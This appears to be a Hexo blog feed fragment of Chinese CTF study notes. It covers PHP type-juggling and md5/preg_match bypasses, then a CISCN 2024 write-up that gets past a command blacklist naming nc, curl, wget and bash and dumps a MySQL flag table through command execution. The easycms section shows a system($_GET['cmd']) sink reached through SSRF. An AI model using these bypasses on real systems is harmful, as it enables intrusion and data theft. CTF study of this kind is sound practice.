20000000000</span></span><br><span class="line"><span class="variable">$g</span> = <span class="keyword">array</span>(); <span class="comment">// 0</span></span><br><span class="line"><span class="variable">$h</span> = <span class="keyword">array</span>(<span class="number">12</span>); <span class="comment">// 1</span></span><br><span class="line"><span class="variable">$i</span> = <span class="keyword">array</span>(<span class="string">&#x27;1ad&#x27;</span>,<span class="string">&#x27;wd&#x27;</span>); <span class="comment">// 1</span></span><br></pre></td></tr></table></figure><p>这里说一下e和f</p><p>$e作为一个浮点数，因为它使用了科学计数法，2e10代表2 * 10^10^，如果超出范围，则会输出0或者其他不确定的数（这里不是随机数，<del>每一个数对应一个定值</del>）</p><p>$f作为一个字符串，intval会先将其转化为数字然后再作进一步修改，如果转化后的数超出范围，则取最大的整数</p><p>有的ctf招新会这样出：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]/&quot;</span>,<span class="variable">$num</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;easy php!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里就可以利用上述例子提到的数组绕过</p><p>不过get传数组跟php里面传数组时处理的结果会不一样，get传参对数组的处理似乎有点复杂？（找时间复现一下然后加在这下面），而php里面，由于已经明确要传递空数组，因此判断方便（目前只能大体说说）</p><p>num就可以这样赋值：num[]=（啥都行）</p><h1 id="2-弱类型比较"><a href="#2-弱类型比较" class="headerlink" title="2.弱类型比较"></a>2.弱类型比较</h1><p>我们常见的弱类型比较就是<code>==</code>了</p><p>当数据在使用<code>==</code>，php会“悄悄”把数据类型进行转化，这样就不用其他的数据转化脚本。</p><p>这种“悄悄”的转化方式称为<strong>隐式类型转换</strong>，它应用于很多编程语言，例如c，javascript等</p><p> 在8.0版本以前，==的处理比较简单，举个栗子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&#x27;234&#x27;</span> == <span class="number">234</span>); <span class="comment">// bool(true)</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&#x27;234s&#x27;</span>== <span class="number">234</span>);<span class="comment">// bool(true)</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&#x27;ss&#x27;</span> == <span class="number">0</span>);<span class="comment">// bool(true)</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&#x27;ss1&#x27;</span> == <span class="number">0</span>);<span class="comment">// bool(true)</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&#x27;1ss&#x27;</span> == <span class="number">0</span>);<span class="comment">// bool(false)</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&#x27;0x9&#x27;</span> == <span class="number">9</span>);<span class="comment">// bool(false)</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="number">0x9</span> == <span class="number">9</span>);<span class="comment">// bool(true)</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&#x27;2e3&#x27;</span> == <span class="number">2000</span>);<span class="comment">// bool(true)</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="number">2e3</span> == <span class="number">2000</span>);<span class="comment">// bool(true)</span></span><br></pre></td></tr></table></figure><p>这里的弱比较相当于在两端加上了intval</p><p>在8.0版本以后，开发者对==进行优化，对于数值字符串有一个很好的转换方法：</p><ol><li><p>若字符串符合数值字符串的定义，则直接作为字符串进行比较.</p></li><li><p>若字符串不符合数值字符串的定义，则将数值转化为字符串后再进行比较。</p></li></ol><p>数值字符串是指一个包含数字字符的字符串，而像0x7，0b1100110这种有明确进制标识符的不是数值字符串（当然，要符合进制的要求）</p><p>:::warning</p><p>如果像0x9这种数值被包上引号后则会被标识为数值字符串（<del>这么说会感觉有点矛盾</del>），没有被包上引号则作为数值出现</p><p>:::</p><p>以上数据输出如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&#x27;234&#x27;</span> == <span class="number">234</span>); <span class="comment">// bool(true)</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&#x27;234s&#x27;</span>== <span class="number">234</span>);<span class="comment">// bool(false)</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&#x27;ss&#x27;</span> == <span class="number">0</span>);<span class="comment">// bool(false)</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&#x27;ss1&#x27;</span> == <span class="number">0</span>);<span class="comment">// bool(false)</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&#x27;1ss&#x27;</span> == <span class="number">0</span>);<span class="comment">// bool(false)</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&#x27;0x9&#x27;</span> == <span class="number">9</span>);<span class="comment">// bool(false)</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="number">0x9</span> == <span class="number">9</span>);<span class="comment">// bool(true)</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&#x27;2e3&#x27;</span> == <span class="number">2000</span>);<span class="comment">// bool(true)</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="number">2e3</span> == <span class="number">2000</span>);<span class="comment">// bool(true)</span></span><br></pre></td></tr></table></figure><p>更多内容的可以看看<a href="https://blog.csdn.net/qq_44879989/article/details/133230251?ops_request_misc=&request_id=&biz_id=102&utm_term=php8%E7%89%88%E6%9C%AC%E4%B8%8B%E7%9A%84%E5%BC%B1%E6%AF%94%E8%BE%83&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-133230251.142^v100^pc_search_result_base4&spm=1018.2226.3001.4187">这个博客</a></p><p>附上几种数值的常见标识符：</p><p>二进制（0b），八进制（0），十六进制（0x），科学计数法（[0-9]e）</p><p>有的比赛会根据弱比较类型来考怎么绕过，这里列几个比较常见的</p><h2 id="md5绕过"><a href="#md5绕过" class="headerlink" title="md5绕过"></a>md5绕过</h2><p>对于md5而言，目前还没有一个好的算法来对md5编码进行解密，很多网站上的md5解密实际上是通过查询变量的md5值来进行破解的。说白了，破解者通过某些算法来生成字典并对这个md5进行爆破。因此，想通过某一个md5的值来破解得到明文在算法上并不可行</p><p>当md5出现在php时，又该怎么应对呢</p><p>一道经典的题型如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>] != <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]))&#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>对于这种题，我们可以采用数组绕过，因为md5对数组编码后返回为空，我们只需要让数组名不同就行</p><p>特别地，若题目变成这样</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>] != <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]) == <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]))&#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>由于弱比较的特性，我们可以通过爆破来传入相应的值。之前有个例子提到关于科学计数法，e是个比较特殊的字母，我们可以利用0e来进行绕过（毕竟0乘任何数都是0）</p><p>根据这个，我们可以查询哪些数值或字符串能够在md5编码后开头为0e</p><p>:::info</p><p>可以思考一下[0-9]e后如果先接字符后数字或者先数字再字符时会输出什么</p><p>:::</p><h1 id="3-preg-match"><a href="#3-preg-match" class="headerlink" title="3.preg_match"></a>3.preg_match</h1><p>preg_match用于执行匹配正则表达式，说白了就是查找选定字符串中有没有能匹配得上正则表达式部分的。这个只需知道如何看出匹配哪些字符就行，根据条件来写传入的数据</p><p>php文档给出的匹配模式如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">[abc]      单个字符：a、b 或 c</span><br><span class="line">[^abc]     任何单个字符，但不是 a、b 或 c</span><br><span class="line">[a-z]      范围 a-z 内的任何单个字符</span><br><span class="line">[a-zA-Z]   范围 a-z 或 A-Z 内的任何单个字符</span><br><span class="line">^          行首</span><br><span class="line">$          行尾</span><br><span class="line">\A         字符串的开头</span><br><span class="line">\z         字符串的结尾</span><br><span class="line">.          任意单个字符</span><br><span class="line">\s         任意空白字符</span><br><span class="line">\S         任意非空白字符</span><br><span class="line">\d         任意数字</span><br><span class="line">\D         任意非数字</span><br><span class="line">\w         任意单词字符（字母、数字、下划线）</span><br><span class="line">\W         任意非单词字符</span><br><span class="line">\b         任意单词边界字符</span><br><span class="line">(...)      捕获括号内的所有内容</span><br><span class="line">(a|b)      a 或 b</span><br><span class="line">a?         零个或一个 a</span><br><span class="line">a*         零个或多个 a</span><br><span class="line">a+         一个或多个 a</span><br><span class="line">a&#123;3&#125;       正好 3 个 a</span><br><span class="line">a&#123;3,&#125;      3 个或更多 a</span><br><span class="line">a&#123;3,6&#125;     3 到 6 个 a</span><br><span class="line"></span><br><span class="line">i 不区分大小写</span><br><span class="line">m 使点号匹配换行符</span><br><span class="line">x 忽略正则表达式中的空白</span><br><span class="line">o 仅进行一次 #&#123;...&#125; 替换</span><br></pre></td></tr></table></figure><p>例如<code>preg_match(/[a-z][A-Z][0-9]/, $a)</code>表示的是查看$a中是否含有字母和数字，其中字母包含大小写</p><p>在审计这种代码时，需要记住匹配模式中每一个正则表达式表示的是什么</p><p>这里拿一个ctfshow的题目出来说说</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^php$/im&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^php$/i&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;hacker&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;nonononono&#x27;</span>;</span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>第一层匹配是查询所有行中是否至少有一行是php，第二层则是查询第一行中是否只有php</p><p>在/i模式下只能匹配一行，但是加了/m后，php就会解析每一行</p><p>因此可以传入cmd=php%0a123，其中%0a为换行符的url编码</p><p>:::info</p><p>可能有同学会不理解第一次和第二次都能过，因为在/im模式下，php会将%0a识别为换行符，因此我们穿的一行数据在经过解析之后实际上是两行数据；而在/i模式下，%0a只是一个普通的字符串而已</p><p>之前也提过，<code>preg_match(&#39;/^php$/im&#39;, $a)</code>是检查某一行中的从头到尾是否是php，这就意味着你有一行只能是php</p><p>:::</p><h2 id="额外补充一个"><a href="#额外补充一个" class="headerlink" title="额外补充一个"></a>额外补充一个</h2><p><code>strpos</code>用于查找某个字符或某个字符串在某个变量中第一次出现的位置，当匹配字符串时，返回变量中匹配的字符串的第一个字符的位置</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;010101&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$a</span>,<span class="string">&#x27;0&#x27;</span>)); <span class="comment">// 0</span></span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$a</span>,<span class="string">&#x27;1&#x27;</span>)); <span class="comment">// 1</span></span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$a</span>,<span class="string">&#x27;2&#x27;</span>)); <span class="comment">// 无输出</span></span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$a</span>,<span class="string">&#x27;010&#x27;</span>)); <span class="comment">// 0</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="4-highlight-file"><a href="#4-highlight-file" class="headerlink" title="4.highlight_file"></a>4.highlight_file</h1><p>官方文档给出的用法：<code>highlight_file([string] $filename, [bool] $return = false): [string]|[bool]</code></p><p>我们用到的highlight_file一般用于高亮一个文件（展示一个文件的内容并将对应的代码块进行高亮），因此bool类型一般不会用到</p><p>而$filename传入的实际上是文件的地址</p><h1 id="5-file-put-contents"><a href="#5-file-put-contents" class="headerlink" title="5.file_put_contents"></a>5.file_put_contents</h1><p>php官方文档：<code>file_put_contents(</code><br>  <code>[string] $filename,  [mixed] $data,</code><br>  <code>[int] $flags = 0,  [?][resource] $context = **null**</code><br>`): [int]|[false]``</p><p>其中主要的是filename，需要对内容进行写入的文件（传的是文件名而非地址，注意和其他函数的区别），data就是写入的内容</p><p>file_put_contents用于向一个文件里面写内容，针对的是当前目录下的文件，如果当前目录下存在目标文件名，则将该文件进行覆盖重写，反之则创建一个新文件并将内容写入其中</p><h1 id="6-call-user-func"><a href="#6-call-user-func" class="headerlink" title="6.call_user_func"></a>6.call_user_func</h1><p>php官方文档：</p><p><code>call_user_func([callable] $callback, [mixed] ...$args): [mixed]</code></p><p>call_user_func把第一个参数作为回调函数调用</p><p>:::info no-icon</p><p>回调：一个过程，将某个函数作为参数放到另外一个函数中，当另外一个函数执行完后，再转过头来执行这个函数</p><p>而回调函数实际上是一个参数</p><p>:::</p><p>第一个传递的是php的函数，例如eval，hex2bin等</p><p>第二个传递的是回调函数的参数</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;从大一入学学习安全到现在，我已经见识到许多基本漏洞以及这些漏洞的变形，这里就写几篇博客总结一下这段时间的学习，顺便也记录一下一些漏洞，以便查看&lt;/p&gt;
&lt;p&gt;这里从一些常见的php的语言特性和函数开始说起&lt;/p&gt;
&lt;h1 id=&quot;1-intval&quot;&gt;&lt;a href=&quot;#1-intval&quot; class=&quot;headerlink&quot; title=&quot;1.intval&quot;&gt;&lt;/a&gt;1.intval&lt;/h1&gt;&lt;p&gt;细说一下intval的具体用法&lt;/p&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;title function_ invoke__&quot;&gt;intval&lt;/span&gt;(&lt;span class=&quot;keyword&quot;&gt;mixed&lt;/span&gt; &lt;span class=&quot;variable&quot;&gt;$value&lt;/span&gt;, &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;variable&quot;&gt;$base&lt;/span&gt; = &lt;span class=&quot;number&quot;&gt;10&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;code&gt;intval&lt;/code&gt;用于获取变量的整数值，$value为任意类型的变量，后面为进制数，意思是经过转化后输出该进制的数，如果没有数或者输入的数为0，则默认为十进制&lt;/p&gt;
&lt;p&gt;这里罗列了以下几种输入（注释内容为intval转化后的内容）：&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>ssti-First</title>
    <link href="http://luffys93.github.io/2024/06/04/Webbbb/SSTI/ssti-First/"/>
    <id>http://luffys93.github.io/2024/06/04/Webbbb/SSTI/ssti-First/</id>
    <published>2024-06-04T03:42:53.000Z</published>
    <updated>2024-07-31T06:13:51.218Z</updated>
    
    <content type="html"><![CDATA[<p>最近在回顾自己所学时发现有很多地方还是没有学通，比如ssti，xss等，这里就先学一下ssti吧</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;最近在回顾自己所学时发现有很多地方还是没有学通，比如ssti，xss等，这里就先学一下ssti吧&lt;/p&gt;

      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>ciscn2024</title>
    <link href="http://luffys93.github.io/2024/05/27/competition/202405/ciscn2024/"/>
    <id>http://luffys93.github.io/2024/05/27/competition/202405/ciscn2024/</id>
    <published>2024-05-27T02:07:46.000Z</published>
    <updated>2024-07-31T08:37:38.007Z</updated>
    
    <content type="html"><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="simple-php"><a href="#simple-php" class="headerlink" title="simple_php"></a>simple_php</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="string">&#x27;/var/www/html/&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]); </span><br><span class="line">     <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ls|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\*|sort|ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo|more|cc|tac|less|head|\.|&#123;|&#125;|tar|zip|gcc|uniq|vi|vim|file|xxd|base64|date|bash|env|\?|wget|\&#x27;|\&quot;|id|whoami/i&#x27;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">         <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><span id="more"></span><p>这题把flag放到数据库有点没想到</p><p>本题开始通过<code>escapeshellcmd</code>直接把符号过滤了，加上一大串命令的waf显得对这道题有点力不从心</p><p>有一个思路是可以利用php命令将后面输入语句进行解析并执行，这里就涉及到对linux命令的掌握程度了捏，当然了也可以用paste和rev</p><p>paste帮助文件如下：</p><img src="/2024/05/27/competition/202405/ciscn2024/image-20240527102554466.png" class="" title="image-20240527102554466"><p>rev帮助文件如下：</p><img src="/2024/05/27/competition/202405/ciscn2024/image-20240527102653007.png" class="" title="image-20240527102653007"><p>rev就是把文件里的每一行进行倒序输出：</p><img src="/2024/05/27/competition/202405/ciscn2024/image-20240527102739315.png" class="" title="image-20240527102739315"><p>这里用paste</p><p>直接查看/etc/passwd</p><img src="/2024/05/27/competition/202405/ciscn2024/image-20240527102930670.png" class="" title="image-20240527102930670"><p>有mysql的记录，可以试试能不能运行mysql命令</p><img src="/2024/05/27/competition/202405/ciscn2024/image-20240527103017505.png" class="" title="image-20240527103017505"><p>然后开始rce（原本想反弹shell的，但是不知道为什么就是出不来，只能rce了）</p><p>这里用到截断字符串的命令（我先列出sql的查询语句）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo `mysql -uroot -proot -e &quot;show databases&quot;`;</span><br><span class="line">echo `mysql -uroot -proot -e &quot;use PHP_CMS;show tables&quot;`;</span><br><span class="line">echo `mysql -uroot -proot -e &quot;use PHP_CMS;SELECT * FROM F1ag_Se3Re7&quot;`;</span><br></pre></td></tr></table></figure><img src="/2024/05/27/competition/202405/ciscn2024/image-20240527112314826.png" class="" title="image-20240527112314826"><img src="/2024/05/27/competition/202405/ciscn2024/image-20240527112434099.png" class="" title="image-20240527112434099"><img src="/2024/05/27/competition/202405/ciscn2024/image-20240527112603159.png" class="" title="image-20240527112603159"><h2 id="easycms"><a href="#easycms" class="headerlink" title="easycms"></a>easycms</h2><p>之前扫过一遍，有敏感目录flag.php和Readme.txt，提示说flag.php如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>] != <span class="string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;Just input &#x27;cmd&#x27; From 127.0.0.1&quot;</span>;</span><br><span class="line">   <span class="keyword">return</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>$_SERVER[&quot;REMOTE_ADDR&quot;]</code>返回的是真实的ip地址，没法伪造，但是存在SSRF</p><p>查看Readme.txt</p><img src="/2024/05/27/competition/202405/ciscn2024/image-20240527113133391.png" class="" title="image-20240527113133391"><p>有乱码，用wget获取</p><img src="/2024/05/27/competition/202405/ciscn2024/image-20240527113121934.png" class="" title="image-20240527113121934"><p>下载cms后看看它的漏洞报告</p><p>有关SSRF的是这个：</p><img src="/2024/05/27/competition/202405/ciscn2024/image-20240527113746916.png" class="" title="image-20240527113746916"><p>顺着源码查找一下qrcode，最终可定位到<code>/dayrui/Fcms/Control/Api/Api.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">qrcode</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$value</span> = <span class="title function_ invoke__">urldecode</span>(<span class="title class_">\Phpcmf\Service</span>::<span class="title function_ invoke__">L</span>(<span class="string">&#x27;input&#x27;</span>)-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;text&#x27;</span>));</span><br><span class="line">        <span class="variable">$thumb</span> = <span class="title function_ invoke__">urldecode</span>(<span class="title class_">\Phpcmf\Service</span>::<span class="title function_ invoke__">L</span>(<span class="string">&#x27;input&#x27;</span>)-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;thumb&#x27;</span>));</span><br><span class="line">        <span class="variable">$matrixPointSize</span> = (<span class="keyword">int</span>)<span class="title class_">\Phpcmf\Service</span>::<span class="title function_ invoke__">L</span>(<span class="string">&#x27;input&#x27;</span>)-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;size&#x27;</span>);</span><br><span class="line">        <span class="variable">$errorCorrectionLevel</span> = <span class="title function_ invoke__">dr_safe_replace</span>(<span class="title class_">\Phpcmf\Service</span>::<span class="title function_ invoke__">L</span>(<span class="string">&#x27;input&#x27;</span>)-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;level&#x27;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//生成二维码图片</span></span><br><span class="line">        <span class="keyword">require_once</span> CMSPATH.<span class="string">&#x27;Library/Phpqrcode.php&#x27;</span>;</span><br><span class="line">        <span class="variable">$file</span> = WRITEPATH.<span class="string">&#x27;file/qrcode-&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$value</span>.<span class="variable">$thumb</span>.<span class="variable">$matrixPointSize</span>.<span class="variable">$errorCorrectionLevel</span>).<span class="string">&#x27;-qrcode.png&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (!IS_DEV &amp;&amp; <span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>)) &#123;</span><br><span class="line">            <span class="variable">$QR</span> = <span class="title function_ invoke__">imagecreatefrompng</span>(<span class="variable">$file</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="title class_">\QRcode</span>::<span class="title function_ invoke__">png</span>(<span class="variable">$value</span>, <span class="variable">$file</span>, <span class="variable">$errorCorrectionLevel</span>, <span class="variable">$matrixPointSize</span>, <span 